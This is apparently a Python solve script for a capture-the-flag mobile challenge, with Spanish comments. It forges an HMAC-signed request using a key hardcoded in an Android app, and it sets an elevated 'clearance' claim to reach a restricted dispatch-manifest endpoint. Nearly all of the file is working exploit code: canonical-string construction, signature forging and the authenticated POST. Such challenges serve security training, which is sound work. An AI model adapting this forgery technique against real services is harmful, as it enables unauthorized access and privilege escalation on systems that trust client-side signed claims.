#!/usr/bin/env python3
# Signed Sincerely (Fluid Attacks CTF 2026, Mobile) -- clave HMAC hardcodeada en APK -> forjar clearance.
# Uso:    ./despacho_hmac_forge.py <base_url> [clearance]
# Ejemplo: ./despacho_hmac_forge.py https://<host>.chal.ctf.ae auditor
#
# El gateway "stateless" confia en el claim `clearance` que viaja DENTRO del envelope firmado por
# el cliente, verificando solo la firma HMAC-SHA256. La clave sale del APK (strings.xml/BuildConfig).
# String canonico: METHOD\npath\nbody (sin newline final); digest hex minuscula en X-Despacho-Signature.
# El body debe re-serializarse EXACTO (JSONObject.toString de Kotlin = JSON compacto sin espacios).

import sys, json, hmac, hashlib, urllib.request

BASE      = sys.argv[1].rstrip("/")
CLEARANCE = sys.argv[2] if len(sys.argv) > 2 else "auditor"

KEY    = b"qr-despacho-v3-9c41e7a8f2b06d5e"          # hardcodeada en el APK
METHOD = "POST"
PATH   = "/api/v1/dispatch/manifest/consolidated"

envelope = {
    "session": {"courier_id": "CX-DEMO", "depot": "lima-centro", "clearance": CLEARANCE},
    "request": {"scope": "consolidated"},
}
body = json.dumps(envelope, separators=(",", ":"))   # compacto, sin espacios (== Kotlin)
canonical = f"{METHOD}\n{PATH}\n{body}"               # sin newline final
sig = hmac.new(KEY, canonical.encode(), hashlib.sha256).hexdigest()

req = urllib.request.Request(
    f"{BASE}{PATH}", data=body.encode(), method="POST",
    headers={"Content-Type": "application/json",
             "X-Despacho-Signature": sig,
             "User-Agent": "Despacho/3.0 (Android)"},
)
with urllib.request.urlopen(req, timeout=15) as r:
    print(r.read().decode(errors="replace"))
